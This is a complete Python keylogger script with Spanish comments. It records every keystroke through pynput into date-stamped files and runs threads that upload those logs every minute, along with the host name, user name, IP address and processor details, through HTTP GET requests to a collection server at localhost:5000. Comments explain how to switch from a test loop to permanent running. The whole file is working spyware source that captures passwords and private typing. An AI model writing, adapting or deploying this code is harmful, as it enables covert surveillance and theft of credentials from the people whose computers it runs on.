# Lib para el uso de hilos
import threading
# Lib para pruebas con sleep
import time
## Librerías para keylogger
# Lib para la fecha
import datetime
# Lib para capturar las teclas presionadas.
from pynput.keyboard import Listener, Controller
# Lib para mostrar el sistema operativo.
import os
# Lib para conocer el IP.
import socket
# Lib para conocer el Sistema Operativo.
import platform
# 
import getpass
# Lib para consultas HTML
import requests
# Lib para utilizar expresiones regulares.
import re 

# Proceso para capturar y escribir en un docuemento las teclas presionadas.
def key_recorder(key):
      # Calculamos el nombre del archivo a crear.
      d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M')

      # Cargamos en key el valor de la tecla presionada.
      key=str(key)

      # Abrimos el archivo con nombre de la fecha de creación
      f= open('keylogger_{}.txt'.format(d),'a')
      
       # SOLO PARA LA FASE DE PRUEBAS, permite salir del programa
      if key == "'\\x03'":
            f.close()
            quit()

      # Usando expresiones regulares buscamos palabras que sean
      # Key, para colocarlas con []
      if re.match('Key.*', key):
            key = '[' + key + ']'
            key = key.replace("Key.","")
            f.write(key)
      else:
            key = key.replace("'", "")
            f.write(key)


# Código para iniciar el keylogger
def keylogger():
      # Código 
      with Listener(on_press=key_recorder) as l:
            l.join()



def uploadData():
      # Para hacer pruebas. Para un funcionamiento permantente, comentar la siguiente línea.
      i = 0

      # Para hacer pruebas. Para un funcionamiento permantente, comentar por "while True"
      while i<100000:
            
            # Lógica principal del programa 
            text = ''
            d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M')
            time.sleep(60)
            try:
                  f= open('keylogger_{}.txt'.format(d),'r')
                  text = f.read()
                  response = requests.get('http://localhost:5000/upload/' + text )

            except Exception as e:
                  print('No encontrado')


            # Para hacer pruebas. Para un funcionamiento permantente, comentar la siguiente línea.
            i = i + 1

def uploadSysInfo():
      file= open('systemInfo.txt','w')
      hostname = socket.gethostname() # Nombre de la PC
      text = ''
      text = text + 'Nombre de la PC: ' + str(socket.gethostname())+ '%'
      text = text + 'Nombre del usuario: ' + str(getpass.getuser()) + '%'
      text = text + 'IP: '+ str(socket.gethostbyname(hostname)) + '%'
      text = text + 'Arquitectura de Python y Sistema Operativo: ' + str(platform.architecture()) + '%'
      text = text + 'Modelo de procesador: ' + str(platform.processor())
      file.write(text)
      file.close()
      text = 'var sysInfo = \\`' + text + '\\`'
      requests.get('http://localhost:5000/uploadSysInfo/' + text.replace('\\','') )
      

def mainProcess():
      print('Proceso principal.')
      
      p01 = threading.Thread(name='Keylogger', target=keylogger)
      p02 = threading.Thread(name='uploadData', target=uploadData)
      p03 = threading.Thread(name='uploadSysInfo', target=uploadSysInfo)

      p01.start()
      p02.start()
      p03.start()

#Ejecutando el proceso principal.
mainProcess()